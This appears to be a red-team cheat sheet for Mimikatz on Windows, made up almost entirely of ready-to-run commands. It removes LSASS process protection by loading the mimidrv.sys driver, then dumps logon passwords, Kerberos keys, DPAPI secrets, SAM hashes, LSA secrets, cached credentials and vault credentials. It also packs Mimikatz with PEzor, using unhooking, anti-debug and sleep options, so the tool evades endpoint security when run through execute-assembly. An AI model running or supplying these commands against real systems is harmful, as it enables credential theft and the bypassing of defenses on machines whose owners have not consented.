# Mimikatz

## Disable LSA Protection

### 1) We need to upload the mimidrv.sys from where mimikatz would execute from

    upload /home/kali/tools/bins/csharp-files/mimidrv.sys c:/windows/temp/mimidrv.sys

### 2) Go to the directory

    cd c:/windows/temp/
    ls

### 3) Load the mimidrv driver and remove protection from LSASS

    mimikatz '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove"'

## Machine Credentials

### 1) LSASS Dump

    mimikatz "token::elevate" "sekurlsa::logonpasswords" "exit"
    mimikatz "token::elevate" "sekurlsa::dpapi" "exit"
    mimikatz "token::elevate" "sekurlsa::ekeys" "exit"
    mimikatz "token::elevate" "sekurlsa::wdigest" "exit"


### 2) SAM/Secrets/Cache dump

    mimikatz "token::elevate" "lsadump::sam" "exit"
    mimikatz "token::elevate" "lsadump::secrets" "exit"
    mimikatz "token::elevate" "lsadump::cache" "exit"


### 3) Vault dump

    mimikatz '"token::elevate" "vault::list" "exit"'
    mimikatz '"token::elevate" "vault::cred /patch" "exit"'

## PEZor - Mimikatz

For converting the mimikatz binary into a C# binary with preloaded arguments and to run with execute-assembly

### 1) Mimikatz

    mimikatz "privilege::debug" "exit"
    PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "exit"'
    execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe

### 2) We need to upload the mimidrv.sys from where mimikatz would execute from

    upload /home/kali/tools/bins/csharp-files/mimidrv.sys c:/windows/temp/mimidrv.sys

### 3) Go to the directory

    cd c:/windows/temp/
    ls

### 4) Now use PEzor to convert mimikatz into a C# executable with arguments to unload LSA protection by loading mimidrv.sys driver

    mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

### 5) Looks like this - Rinse and repeat for other mimikatz commands

    PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"'
    execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe
